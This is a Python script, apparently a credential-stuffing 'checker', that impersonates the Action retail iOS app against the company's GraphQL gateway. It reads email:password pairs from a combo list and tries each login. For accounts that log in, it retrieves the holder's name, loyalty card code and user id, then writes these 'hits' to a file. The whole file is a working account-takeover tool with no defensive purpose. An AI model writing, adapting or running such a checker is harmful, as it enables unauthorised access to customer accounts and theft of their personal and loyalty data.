import requests, threading, json

class action:
    def login(u, p):
        headers = {
            'Host': 'gateway.action.com',
            'Content-Type': 'application/json',
            'X-Client-App-Type': 'consumer',
            'Accept': 'application/json',
            'X-Client-Os': 'iOS',
            'X-Client-Version': '1.63.0',
            'Apollographql-Client-Version': '1.63.0',
            'Api-Version': '1',
            'X-Draft-Mode': 'false',
            'Accept-Language': 'de-DE',
            # 'Accept-Encoding': 'gzip, deflate, br',
            'X-Client-Type': 'app',
            'X-Apollo-Operation-Id': '71a537ba46d08a707c6e8548ce2167289f4b737061348ba3c0ac558495987389',
            # 'Content-Length': '265',
            'X-Apollo-Operation-Type': 'mutation',
            'User-Agent': 'Action/6914 CFNetwork/1410.0.3 Darwin/22.6.0',
            'Apollographql-Client-Name': 'app-iOS',
            'X-Apollo-Operation-Name': 'Login',
        }
        json_data = {
            'extensions': {
                'persistedQuery': {
                    'headers': {
                        'Accept-Language': 'de-DE',
                    },
                    'sha256Hash': '71a537ba46d08a707c6e8548ce2167289f4b737061348ba3c0ac558495987389',
                    'version': 1,
                },
            },
            'operationName': 'Login',
            'variables': {
                'input': {
                    'email': u,
                    'password': p,
                },
            },
        }

        response = requests.post('https://gateway.action.com/api/gateway', headers=headers, json=json_data)
        if 'type":"INVALID"' in response.text:
            print(f"FAIL | {u}:{p} | {response.text}")
        elif 'accessToken' in response.text:
            json_data = response.text.replace("'", "\"")
            parsed_data = json.loads(json_data)
            accessToken = parsed_data['data']['login']['result']['accessToken']
            refreshToken = parsed_data['data']['login']['result']['refreshToken']
            userinfo = action.userinfo(accessToken)
            userinfo_data = json.loads(userinfo.text)
            firstName = userinfo_data['data']["currentUser"]["firstName"]
            lastName = userinfo_data['data']["currentUser"]["lastName"]
            matrixCode = userinfo_data["data"]["currentUser"]["loyaltyCard"]["matrixCode"]
            matrixFormat = userinfo_data["data"]["currentUser"]["loyaltyCard"]["matrixFormat"]
            id = userinfo_data["data"]["currentUser"]["id"]
            print(f"SUCCESS | {u}:{p} | firstName: {firstName} | lastName: {lastName} | loyaltyCard:{{'matrixCode': {matrixCode}, 'matrixFormat': {matrixFormat}}} | id: {id}")
            with open("hits.txt", "a") as f:
                f.write(f"{u}:{p} | firstName: {firstName} | lastName: {lastName} | loyaltyCard:{{'matrixCode': {matrixCode}, 'matrixFormat': {matrixFormat}}} | id: {id}\n")
    def userinfo(accessToken):
        headers = {
            'Host': 'gateway.action.com',
            'Content-Type': 'application/json',
            'X-Client-App-Type': 'consumer',
            'Accept': 'application/json',
            'Apollographql-Client-Version': '1.63.0',
            'Authorization': f'Bearer {accessToken}',
            'X-Client-Os': 'iOS',
            'X-Client-Version': '1.63.0',
            'Api-Version': '1',
            'X-Draft-Mode': 'false',
            'Accept-Language': 'de-DE',
            # 'Accept-Encoding': 'gzip, deflate, br',
            'X-Client-Type': 'app',
            'X-Apollo-Operation-Id': '496a6cc326259104e4d3c1486a941dff933224eee2ce42f92acdc006b59c1bf7',
            'X-Apollo-Operation-Type': 'query',
            'User-Agent': 'Action/6914 CFNetwork/1410.0.3 Darwin/22.6.0',
            'Apollographql-Client-Name': 'app-iOS',
            'X-Apollo-Operation-Name': 'GetCurrentUser',
        }

        response = requests.get(
            'https://gateway.action.com/api/gateway?extensions=%7B%22persistedQuery%22:%7B%22headers%22:%7B%22Accept-Language%22:%22de-DE%22%7D,%22sha256Hash%22:%22496a6cc326259104e4d3c1486a941dff933224eee2ce42f92acdc006b59c1bf7%22,%22version%22:1%7D%7D&operationName=GetCurrentUser',
            headers=headers,
        )

        return response

            
combolist = open("combo.txt", encoding="utf-8").read().split("\n")

for combo in combolist:
    c = combo.split(":") 
    action.login(c[0], c[1])
